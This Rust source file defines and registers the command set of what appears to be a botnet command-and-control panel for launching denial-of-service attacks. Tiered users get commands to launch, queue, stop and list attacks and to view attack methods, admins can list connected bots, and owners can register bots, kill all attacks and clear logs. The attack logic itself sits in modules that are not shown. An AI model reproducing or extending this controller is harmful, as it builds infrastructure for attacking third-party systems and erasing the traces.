use std::sync::Arc;
use async_trait::async_trait;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::Result;
use crate::modules::auth::Level;
use super::registry::Command;
use super::general;
use super::admin;
use super::owner;
use super::attack;

// --- General Commands ---

pub struct HelpCommand;
#[async_trait]
impl Command for HelpCommand {
    fn name(&self) -> &'static str { "help" }
    fn description(&self) -> &'static str { "Show help menu" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_help_command(client, state).await
    }
}

pub struct StatsCommand;
#[async_trait]
impl Command for StatsCommand {
    fn name(&self) -> &'static str { "stats" }
    fn description(&self) -> &'static str { "Show server statistics" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_stats_command(client, state).await
    }
}

pub struct HealthCommand;
#[async_trait]
impl Command for HealthCommand {
    fn name(&self) -> &'static str { "health" }
    fn description(&self) -> &'static str { "Show system health status" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_health_command(client, state).await
    }
}

pub struct OnlineCommand;
#[async_trait]
impl Command for OnlineCommand {
    fn name(&self) -> &'static str { "online" }
    fn description(&self) -> &'static str { "Show online users" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_online_command(client, state).await
    }
}

pub struct WhoAmICommand;
#[async_trait]
impl Command for WhoAmICommand {
    fn name(&self) -> &'static str { "whoami" }
    fn description(&self) -> &'static str { "Show your user information" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, _state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_whoami_command(client).await
    }
}

pub struct UptimeCommand;
#[async_trait]
impl Command for UptimeCommand {
    fn name(&self) -> &'static str { "uptime" }
    fn description(&self) -> &'static str { "Show server uptime" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_uptime_command(client, state).await
    }
}

pub struct GifCommand;
#[async_trait]
impl Command for GifCommand {
    fn name(&self) -> &'static str { "gif" }
    fn description(&self) -> &'static str { "Play a GIF animation" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, _state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        general::handle_gif_command(client, &args).await
    }
}

pub struct MethodsCommand;
#[async_trait]
impl Command for MethodsCommand {
    fn name(&self) -> &'static str { "methods" }
    fn description(&self) -> &'static str { "Show available attack methods" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_methods_command(client, state).await
    }
}

pub struct DashboardCommand;
#[async_trait]
impl Command for DashboardCommand {
    fn name(&self) -> &'static str { "dashboard" }
    fn description(&self) -> &'static str { "Show the dashboard" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_dashboard_command(client, state).await
    }
}

pub struct VersionCommand;
#[async_trait]
impl Command for VersionCommand {
    fn name(&self) -> &'static str { "version" }
    fn description(&self) -> &'static str { "Show server version" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, _state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_version_command(client).await
    }
}

pub struct RulesCommand;
#[async_trait]
impl Command for RulesCommand {
    fn name(&self) -> &'static str { "rules" }
    fn description(&self) -> &'static str { "Show server rules" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, _state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        general::handle_rules_command(client).await
    }
}

// --- Admin Commands ---

pub struct AdminCommand;
#[async_trait]
impl Command for AdminCommand {
    fn name(&self) -> &'static str { "admin" }
    fn description(&self) -> &'static str { "Show admin menu" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_admin_command(client, state).await
    }
}

pub struct BotsCommand;
#[async_trait]
impl Command for BotsCommand {
    fn name(&self) -> &'static str { "bots" }
    fn description(&self) -> &'static str { "List connected bots" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_listbots_command(client, state).await
    }
}

pub struct KickCommand;
#[async_trait]
impl Command for KickCommand {
    fn name(&self) -> &'static str { "kick" }
    fn description(&self) -> &'static str { "Kick a user" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_kick_command(client, state).await
    }
}

pub struct BanCommand;
#[async_trait]
impl Command for BanCommand {
    fn name(&self) -> &'static str { "ban" }
    fn description(&self) -> &'static str { "Ban a user" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_ban_command(client, state).await
    }
}

pub struct UnbanCommand;
#[async_trait]
impl Command for UnbanCommand {
    fn name(&self) -> &'static str { "unban" }
    fn description(&self) -> &'static str { "Unban a user" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_unban_command(client, state).await
    }
}

pub struct BanListCommand;
#[async_trait]
impl Command for BanListCommand {
    fn name(&self) -> &'static str { "banlist" }
    fn description(&self) -> &'static str { "List banned users" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_banlist_command(client, state).await
    }
}

pub struct BroadcastCommand;
#[async_trait]
impl Command for BroadcastCommand {
    fn name(&self) -> &'static str { "broadcast" }
    fn description(&self) -> &'static str { "Broadcast a message to all users" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        let message = if args.len() > 1 {
            args[1..].join(" ")
        } else {
            String::new()
        };
        admin::handle_broadcast_command(client, state, &message).await
    }
}

pub struct LogsCommand;
#[async_trait]
impl Command for LogsCommand {
    fn name(&self) -> &'static str { "logs" }
    fn description(&self) -> &'static str { "View system logs" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        let lines = args.get(1).and_then(|s| s.parse::<usize>().ok()).unwrap_or(20);
        admin::handle_logs_command(client, state, lines).await
    }
}

pub struct SessionsCommand;
#[async_trait]
impl Command for SessionsCommand {
    fn name(&self) -> &'static str { "sessions" }
    fn description(&self) -> &'static str { "View active sessions" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_sessions_command(client, state).await
    }
}

pub struct UserInfoCommand;
#[async_trait]
impl Command for UserInfoCommand {
    fn name(&self) -> &'static str { "userinfo" }
    fn description(&self) -> &'static str { "View user information" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        admin::handle_userinfo_command(client, state, &args).await
    }
}

pub struct LockCommand;
#[async_trait]
impl Command for LockCommand {
    fn name(&self) -> &'static str { "lock" }
    fn description(&self) -> &'static str { "Lock a user account" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        admin::handle_lock_command(client, state, &args).await
    }
}

pub struct BotCountCommand;
#[async_trait]
impl Command for BotCountCommand {
    fn name(&self) -> &'static str { "botcount" }
    fn description(&self) -> &'static str { "Show bot statistics" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_botcount_command(client, state).await
    }
}

pub struct ListUsersCommand;
#[async_trait]
impl Command for ListUsersCommand {
    fn name(&self) -> &'static str { "users" }
    fn description(&self) -> &'static str { "List all users" }
    fn required_level(&self) -> Level { Level::Admin }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        admin::handle_listusers_command(client, state).await
    }
}

// --- Owner Commands ---

pub struct OwnerCommand;
#[async_trait]
impl Command for OwnerCommand {
    fn name(&self) -> &'static str { "owner" }
    fn description(&self) -> &'static str { "Show owner menu" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        owner::handle_owner_command(client, state).await
    }
}

pub struct RegBotCommand;
#[async_trait]
impl Command for RegBotCommand {
    fn name(&self) -> &'static str { "regbot" }
    fn description(&self) -> &'static str { "Register a new bot" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_regbot_command(client, state, &args).await
    }
}

pub struct KillAllCommand;
#[async_trait]
impl Command for KillAllCommand {
    fn name(&self) -> &'static str { "killall" }
    fn description(&self) -> &'static str { "Kill all attacks" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        owner::handle_killall_command(client, state).await
    }
}

pub struct BackupsCommand;
#[async_trait]
impl Command for BackupsCommand {
    fn name(&self) -> &'static str { "backups" }
    fn description(&self) -> &'static str { "List backups" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, _state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        owner::handle_listbackups_command(client).await
    }
}

pub struct RestoreCommand;
#[async_trait]
impl Command for RestoreCommand {
    fn name(&self) -> &'static str { "restore" }
    fn description(&self) -> &'static str { "Restore from backup" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_restore_command(client, state, &args).await
    }
}

pub struct DbCommand;
#[async_trait]
impl Command for DbCommand {
    fn name(&self) -> &'static str { "db" }
    fn description(&self) -> &'static str { "Database operations" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_db_command(client, state, &args).await
    }
}

pub struct AddUserCommand;
#[async_trait]
impl Command for AddUserCommand {
    fn name(&self) -> &'static str { "adduser" }
    fn description(&self) -> &'static str { "Add a new user" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_adduser_command(client, state, &args).await
    }
}

pub struct DelUserCommand;
#[async_trait]
impl Command for DelUserCommand {
    fn name(&self) -> &'static str { "deluser" }
    fn description(&self) -> &'static str { "Delete a user" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_deluser_command(client, state, &args).await
    }
}

pub struct ChangePassCommand;
#[async_trait]
impl Command for ChangePassCommand {
    fn name(&self) -> &'static str { "changepass" }
    fn description(&self) -> &'static str { "Change user password" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_changepass_command(client, state, &args).await
    }
}

pub struct ClearLogsCommand;
#[async_trait]
impl Command for ClearLogsCommand {
    fn name(&self) -> &'static str { "clearlogs" }
    fn description(&self) -> &'static str { "Clear system logs" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        owner::handle_clearlogs_command(client, state).await
    }
}

pub struct UserChangeCommand;
#[async_trait]
impl Command for UserChangeCommand {
    fn name(&self) -> &'static str { "userchange" }
    fn description(&self) -> &'static str { "Change user details" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_userchange_command(client, state, &args).await
    }
}

pub struct WhitelistCommand;
#[async_trait]
impl Command for WhitelistCommand {
    fn name(&self) -> &'static str { "whitelist" }
    fn description(&self) -> &'static str { "Whitelist an IP" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_whitelist_command(client, state, &args).await
    }
}

pub struct BlacklistCommand;
#[async_trait]
impl Command for BlacklistCommand {
    fn name(&self) -> &'static str { "blacklist" }
    fn description(&self) -> &'static str { "Blacklist an IP" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_blacklist_command(client, state, &args).await
    }
}

pub struct ConfigCommand;
#[async_trait]
impl Command for ConfigCommand {
    fn name(&self) -> &'static str { "config" }
    fn description(&self) -> &'static str { "Update configuration" }
    fn required_level(&self) -> Level { Level::Owner }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        owner::handle_config_command(client, state, &args).await
    }
}

// --- Attack Commands ---

pub struct AttackCommand;
#[async_trait]
impl Command for AttackCommand {
    fn name(&self) -> &'static str { "attack" }
    fn description(&self) -> &'static str { "Launch an attack" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        attack::handle_attack_command(client, state, &args).await
    }
}

pub struct OngoingCommand;
#[async_trait]
impl Command for OngoingCommand {
    fn name(&self) -> &'static str { "ongoing" }
    fn description(&self) -> &'static str { "Show ongoing attacks" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        attack::handle_ongoing_command(client, state).await
    }
}

pub struct StopCommand;
#[async_trait]
impl Command for StopCommand {
    fn name(&self) -> &'static str { "stop" }
    fn description(&self) -> &'static str { "Stop an attack" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, args: Vec<&str>) -> Result<()> {
        attack::handle_stop_command(client, state, &args).await
    }
}

pub struct HistoryCommand;
#[async_trait]
impl Command for HistoryCommand {
    fn name(&self) -> &'static str { "history" }
    fn description(&self) -> &'static str { "Show attack history" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        attack::handle_history_command(client, state).await
    }
}

pub struct QueueCommand;
#[async_trait]
impl Command for QueueCommand {
    fn name(&self) -> &'static str { "queue" }
    fn description(&self) -> &'static str { "Show attack queue" }
    fn required_level(&self) -> Level { Level::Basic }
    async fn execute(&self, client: &Arc<Client>, state: &Arc<AppState>, _args: Vec<&str>) -> Result<()> {
        attack::handle_queue_command(client, state).await
    }
}

pub fn register_all(registry: &mut super::registry::CommandRegistry) {
    // General
    registry.register(Box::new(HelpCommand));
    registry.register(Box::new(StatsCommand));
    registry.register(Box::new(HealthCommand));
    registry.register(Box::new(OnlineCommand));
    registry.register(Box::new(WhoAmICommand));
    registry.register(Box::new(UptimeCommand));
    registry.register(Box::new(GifCommand));
    registry.register(Box::new(MethodsCommand));
    registry.register(Box::new(DashboardCommand));
    registry.register(Box::new(VersionCommand));
    registry.register(Box::new(RulesCommand));

    // Admin
    registry.register(Box::new(AdminCommand));
    registry.register(Box::new(BotsCommand));
    registry.register(Box::new(KickCommand));
    registry.register(Box::new(BanCommand));
    registry.register(Box::new(UnbanCommand));
    registry.register(Box::new(BanListCommand));
    registry.register(Box::new(BroadcastCommand));
    registry.register(Box::new(LogsCommand));
    registry.register(Box::new(SessionsCommand));
    registry.register(Box::new(UserInfoCommand));
    registry.register(Box::new(LockCommand));
    registry.register(Box::new(BotCountCommand));
    registry.register(Box::new(ListUsersCommand));

    // Owner
    registry.register(Box::new(OwnerCommand));
    registry.register(Box::new(RegBotCommand));
    registry.register(Box::new(KillAllCommand));
    registry.register(Box::new(BackupsCommand));
    registry.register(Box::new(RestoreCommand));
    registry.register(Box::new(DbCommand));
    registry.register(Box::new(AddUserCommand));
    registry.register(Box::new(DelUserCommand));
    registry.register(Box::new(ChangePassCommand));
    registry.register(Box::new(ClearLogsCommand));
    registry.register(Box::new(UserChangeCommand));
    registry.register(Box::new(WhitelistCommand));
    registry.register(Box::new(BlacklistCommand));
    registry.register(Box::new(ConfigCommand));

    // Attack
    registry.register(Box::new(AttackCommand));
    registry.register(Box::new(OngoingCommand));
    registry.register(Box::new(StopCommand));
    registry.register(Box::new(HistoryCommand));
    registry.register(Box::new(QueueCommand));
}
